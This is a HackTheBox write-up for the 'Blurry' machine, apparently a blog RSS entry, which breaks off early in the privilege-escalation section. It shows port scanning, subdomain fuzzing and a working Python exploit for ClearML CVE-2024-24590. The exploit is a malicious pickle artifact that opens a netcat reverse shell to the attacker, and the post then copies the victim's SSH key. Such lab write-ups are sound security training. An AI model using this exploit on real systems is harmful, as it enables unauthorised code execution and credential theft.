<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ClearML on</title><link>https://h4r1337.github.io/tags/clearml/</link><description>Recent content in ClearML on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 13 Oct 2024 18:13:48 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/clearml/index.xml" rel="self" type="application/rss+xml"/><item><title>Blurry | HackTheBox</title><link>https://h4r1337.github.io/posts/blurry/</link><pubDate>Sun, 13 Oct 2024 18:13:48 +0530</pubDate><guid>https://h4r1337.github.io/posts/blurry/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/cover.webp">&lt;/figure>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: center">Title&lt;/th>
&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Blurry">Blurry&lt;/a>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: center">Difficulty&lt;/td>
&lt;td style="text-align: center">Medium&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">Machine&lt;/td>
&lt;td style="text-align: center">Linux&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">Maker&lt;/td>
&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/458049">&lt;img src="https://www.hackthebox.com/badge/image/458049" alt="" style="display: unset">&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;br>
&lt;div class="alert alert-tip collapsed">
&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
&lt;i class="bx bx-bulb">&lt;/i>
&lt;p class="alert-heading">
About Blurry
&lt;/p>
&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
&lt;/div>
&lt;div class="alert-content" style="display: none;" >
&lt;p>Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning. The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite. The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24590">CVE-2024-24590&lt;/a> - &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24595">CVE-2024-24595&lt;/a>) that can be chained together for remote code execution. Once a shell on the target is obtained, a program that can be run with &lt;code>sudo&lt;/code> is discovered. The program loads arbitrary &lt;code>PyTorch&lt;/code> models to evaluate them against a protected dataset. While it is known that such models are susceptible to insecure deserialisation, &lt;code>fickling&lt;/code> is used to scan the dataset for insecure &lt;code>pickle&lt;/code> files , prior to loading the model. Malicious code can be injected into a model, using &lt;code>runpy&lt;/code> to bypass the &lt;code>fickling&lt;/code> checks.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/cover.webp">&lt;/figure>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: center">Title&lt;/th>
&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Blurry">Blurry&lt;/a>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: center">Difficulty&lt;/td>
&lt;td style="text-align: center">Medium&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">Machine&lt;/td>
&lt;td style="text-align: center">Linux&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">Maker&lt;/td>
&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/458049">&lt;img src="https://www.hackthebox.com/badge/image/458049" alt="" style="display: unset">&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;br>
&lt;div class="alert alert-tip collapsed">
&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
&lt;i class="bx bx-bulb">&lt;/i>
&lt;p class="alert-heading">
About Blurry
&lt;/p>
&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
&lt;/div>
&lt;div class="alert-content" style="display: none;" >
&lt;p>Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning. The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite. The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24590">CVE-2024-24590&lt;/a> - &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24595">CVE-2024-24595&lt;/a>) that can be chained together for remote code execution. Once a shell on the target is obtained, a program that can be run with &lt;code>sudo&lt;/code> is discovered. The program loads arbitrary &lt;code>PyTorch&lt;/code> models to evaluate them against a protected dataset. While it is known that such models are susceptible to insecure deserialisation, &lt;code>fickling&lt;/code> is used to scan the dataset for insecure &lt;code>pickle&lt;/code> files , prior to loading the model. Malicious code can be injected into a model, using &lt;code>runpy&lt;/code> to bypass the &lt;code>fickling&lt;/code> checks.&lt;/p>
&lt;/div>
&lt;/div>
&lt;script>
function toggleAlert(headerElement) {
var alertBox = headerElement.parentElement;
var alertContent = alertBox.querySelector('.alert-content');
var icon = headerElement.querySelectorAll('i')[1];
alertBox.classList.toggle('open');
alertBox.classList.toggle('collapsed');
if (alertBox.classList.contains('open')) {
alertContent.style.display = 'block';
icon.classList.remove('open');
icon.classList.add('collapsed');
} else {
icon.classList.remove('collapsed');
icon.classList.add('open');
alertContent.style.display = 'none';
}
}
&lt;/script>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Scanned all TCP ports:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p- -vv --min-rate &lt;span style="color:#d3869b">5000&lt;/span> 10.10.11.19 -oA nmap/ports
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> app.blurry.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.19&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received conn-refused &lt;span style="color:#fe8019">(&lt;/span>0.21s latency&lt;span style="color:#fe8019">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-10-13 12:51:47 IST &lt;span style="color:#fe8019">for&lt;/span> 246s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">43506&lt;/span> filtered ports, &lt;span style="color:#d3869b">22027&lt;/span> closed ports
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reason: &lt;span style="color:#d3869b">43506&lt;/span> no-responses and &lt;span style="color:#d3869b">22027&lt;/span> conn-refused
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p22,80 -vv --min-rate &lt;span style="color:#d3869b">5000&lt;/span> -sC -sV -oA nmap/service 10.10.11.19
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> app.blurry.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.19&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.30s latency&lt;span style="color:#fe8019">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-10-13 13:03:02 IST &lt;span style="color:#fe8019">for&lt;/span> 16s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 &lt;span style="color:#fe8019">(&lt;/span>protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx 1.18.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-favicon: Unknown favicon MD5: 2CBD65DC962D5BF762BCB815CBD5EFCC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.18.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: ClearML
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There are only 2 ports open, &lt;code>80&lt;/code> and &lt;code>22&lt;/code>&lt;/p>
&lt;hr>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;h3 id="port-80---http-nginx-1180">Port 80 - HTTP (Nginx 1.18.0)&lt;/h3>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013125133.webp">&lt;/figure>
&lt;p>Let&amp;rsquo;s add &lt;code>app.blurry.htb&lt;/code> to &lt;code>/etc/hosts&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;10.10.11.19\tapp.blurry.htb&amp;#39;&lt;/span> | sudo tee -a /etc/hosts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013125112.webp">&lt;/figure>
&lt;p>I then checked if there are any other subdomains present.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -u http://10.10.11.19/ -H &lt;span style="color:#b8bb26">&amp;#39;Host: FUZZ.blurry.htb&amp;#39;&lt;/span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;span style="color:#d3869b">169&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="filesblurryhtb">&lt;code>files.blurry.htb&lt;/code>&lt;/h5>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013133519.webp">&lt;/figure>
&lt;h5 id="chatblurryhtb">&lt;code>chat.blurry.htb&lt;/code>&lt;/h5>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013133600.webp">&lt;/figure>
&lt;p>We can create a new account and see all the chats:&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013133903.webp">&lt;/figure>
&lt;p>And there&amp;rsquo;s this information in the announcement channel, this might come in handy later.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013134129.webp">&lt;/figure>
&lt;h5 id="appblurryhtb">&lt;code>app.blurry.htb&lt;/code>&lt;/h5>
&lt;p>This runs a ClearML server which is an open source MLOps platform.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013125332.webp">&lt;/figure>
&lt;p>Create a new account and view the dashboard&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013125823.webp">&lt;/figure>
&lt;p>After looking at some of the requests, found the ClearML version used in this application&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013130137.webp">&lt;/figure>
&lt;p>This version is vulnerable to RCE.&lt;/p>
&lt;hr>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;h3 id="cve-2024-24590---clearml-pickle-artifact-upload-rce">CVE-2024-24590 - ClearML Pickle Artifact Upload RCE&lt;/h3>
&lt;blockquote>
&lt;p>An attacker can execute arbitrary code on an end user&amp;rsquo;s system by uploading a malicious pickle file as an artifact that triggers the deserialization flaw when a user calls the &lt;code>get&lt;/code> method within the &lt;code>Artifact&lt;/code> class to download and load a file into memory.&lt;/p>
&lt;/blockquote>
&lt;p>The research team from &lt;a href="https://hiddenlayer.com">HiddenLayer&lt;/a> found 6 zero-days, including this exploit in both, in the open-source and enterprise versions of ClearML. You can find information about all the other vulnerabilities in their &lt;a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">blog&lt;/a>.&lt;/p>
&lt;p>In python the pickle module is often used to store machine learning models for training, evaluation, and sharing. However, pickle is an inherently insecure module because it executes arbitrary commands when deserialized.
If there are no proper validation checks, and user created pickle files are deserialized, it can lead to remote code execution vulnerabilities. You can learn more about pickle and insecure deserialization vulnerabilites in these articles:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/">Python Serialization Vulnerabilities – Pickle&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://intoli.com/blog/dangerous-pickles/">Dangerous Pickles — Malicious Python Serialization&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>The vulnerability was inside the &lt;code>Artifact.get&lt;/code> method, where the application directly loads the pickle object into memory without any checks. They &lt;a href="https://github.com/allegroai/clearml/commit/e506831599bd8e072e5e54266abfccdfbe4be2ac#diff-dd2d5e773ee93fa198f108f03f3f0b8ed272d858cde70a01d41680327da3f133">fixed&lt;/a> the vulnerability by adding an additional hash validation with the hash value of the local file and the uploaded artifact:&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013142251.webp">&lt;/figure>
&lt;p>To exploit this vulnerability, we first need to upload a malicious artifact file to the ClearML server. If any user happens to download and load the artifact into memory using the &lt;code>Artifact.get&lt;/code> method, we can gain a reverse shell in the server as that user. From the RocketChat instance, we now know that the admin is periodically running an automated task to review all the artifacts with a &lt;code>review&lt;/code> tag inside the &lt;code>Black Swan&lt;/code> project.
Thus, we onle need to upload the artifact to the &lt;code>Black Swan&lt;/code> project with a &lt;code>review&lt;/code> tag and the admin will download it and run it, allowing us to obtain a reverse shell.&lt;/p>
&lt;p>To exploit this we need to install the &lt;code>clearml&lt;/code> pip package:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>pip install clearml
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then in the server, go to settings -&amp;gt; workspace and create new credentials.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013143231.webp">&lt;/figure>
&lt;p>Now add the configurations by running the &lt;code>clearml-init&lt;/code> command, which is installed when you install the &lt;code>clearml&lt;/code> pip package.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013144502.webp">&lt;/figure>
&lt;p>Don&amp;rsquo;t forget to add &lt;code>api.blurry.htb&lt;/code> to your &lt;code>/etc/hosts&lt;/code> file as well.&lt;/p>
&lt;div class="alert alert-note collapsed">
&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
&lt;i class="bx bx-info-circle">&lt;/i>
&lt;p class="alert-heading">
Note
&lt;/p>
&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
&lt;/div>
&lt;div class="alert-content" style="display: none;" >
&lt;p>If you are getting this error:
&lt;code>AttributeError: module 'lib' has no attribute 'OpenSSL_add_all_algorithms'&lt;/code>&lt;/p>
&lt;ul>
&lt;li>Upgrade &lt;code>cryptography&lt;/code>, &lt;code>pyOpenSSL&lt;/code>, and &lt;code>OpenSSL&lt;/code>:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>pip install --upgrade cryptography pyOpenSSL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Reinstall &lt;code>clearml&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>pip install --upgrade clearml
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If this fixes the issue then run &lt;code>clearml-init&lt;/code> to add the configurations again.&lt;/p>
&lt;/div>
&lt;/div>
&lt;script>
function toggleAlert(headerElement) {
var alertBox = headerElement.parentElement;
var alertContent = alertBox.querySelector('.alert-content');
var icon = headerElement.querySelectorAll('i')[1];
alertBox.classList.toggle('open');
alertBox.classList.toggle('collapsed');
if (alertBox.classList.contains('open')) {
alertContent.style.display = 'block';
icon.classList.remove('open');
icon.classList.add('collapsed');
} else {
icon.classList.remove('collapsed');
icon.classList.add('open');
alertContent.style.display = 'none';
}
}
&lt;/script>
&lt;p>Now let&amp;rsquo;s create an exploit to upload our artifact to the server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> clearml &lt;span style="color:#fe8019">import&lt;/span> Task
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> pickle&lt;span style="color:#fe8019">,&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">class&lt;/span> RunCommand:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">__reduce__&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#928374;font-style:italic"># Enter your ip address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#928374;font-style:italic"># Enter listening port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">f&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc &lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>ip&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26"> &lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>port&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26"> &amp;gt;/tmp/f&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> (os&lt;span style="color:#fe8019">.&lt;/span>system, (command,))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">main&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command &lt;span style="color:#fe8019">=&lt;/span> RunCommand()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> task &lt;span style="color:#fe8019">=&lt;/span> Task&lt;span style="color:#fe8019">.&lt;/span>init(project_name&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;Black Swan&amp;#34;&lt;/span>, tags&lt;span style="color:#fe8019">=&lt;/span>[&lt;span style="color:#b8bb26">&amp;#39;review&amp;#39;&lt;/span>], task_name&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;exploit&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> task&lt;span style="color:#fe8019">.&lt;/span>upload_artifact(name&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;pickle_artifact&amp;#39;&lt;/span>, artifact_object&lt;span style="color:#fe8019">=&lt;/span>command, retries&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">2&lt;/span>, wait_on_upload&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> __name__ &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And now start a netcat listener:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nc -lnvp &lt;span style="color:#d3869b">1234&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>then run the exploit:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>python3 exploit.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>wait for the task to run&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013150806.webp">&lt;/figure>
&lt;p>let&amp;rsquo;s copy &lt;code>.ssh/id_rsa&lt;/code> file to login using ssh.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013150951.webp">&lt;/figure>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#d3869b">600&lt;/span> id_rsa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh jippity@10.10.11.19 -i id_rsa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013151228.webp">&lt;/figure>
&lt;hr>
&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013151347.webp">&lt;/figure>
&lt;p>There are only 2 users in this machine. The user jippity can run &lt;code>/usr/bin/evaluate_model&lt;/code> as root.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013151435.webp">&lt;/figure>
&lt;p>which is a bash script:&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013151728.webp">&lt;/figure>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>&lt;span style="color:#928374;font-style:italic"># Evaluate a given model against our proprietary dataset.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Security checks against model file included.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$#&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -ne &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/echo &lt;span style="color:#b8bb26">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#b8bb26"> &amp;lt;path_to_model.pth&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MODEL_FILE&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$1&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TEMP_DIR&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;/opt/temp&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PYTHON_SCRIPT&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;/models/evaluate_model.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/mkdir -p &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file_type&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>/usr/bin/file --brief &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Extract based on file type&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$file_type&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">==&lt;/span> *&lt;span style="color:#b8bb26">&amp;#34;POSIX tar archive&amp;#34;&lt;/span>* &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># POSIX tar archive (older PyTorch format)&lt;/span>
